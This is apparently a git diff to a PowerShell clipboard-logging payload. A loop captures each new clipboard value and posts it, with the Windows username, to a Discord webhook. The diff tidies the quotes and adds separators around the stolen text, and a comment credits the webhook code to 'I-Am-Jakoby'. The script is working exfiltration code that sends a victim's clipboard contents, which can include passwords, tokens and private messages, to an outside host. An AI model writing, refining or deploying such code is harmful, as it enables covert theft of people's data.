@@ -14,10 +14,15 @@ while($true)
     	{
 		$PreviousClipboard = $currentClipboard
 
+		# Replace curly double quotes with regular double quotes
+        	$currentClipboard = $currentClipboard -replace '“', '"'
+        	$currentClipboard = $currentClipboard -replace '”', '"'
+		
+		
 		#Discord webhook send code from I-Am-Jakoby
 		$Body = @{
   			'username' = $env:username
-  			'content' = $currentClipboard
+  			'content' = "----------------------------`n`n" + $currentClipboard + "`n`n"
 		}
 		Invoke-RestMethod -ContentType 'Application/Json' -Uri $webhookUrl  -Method Post -Body ($Body | ConvertTo-Json)
 	}	
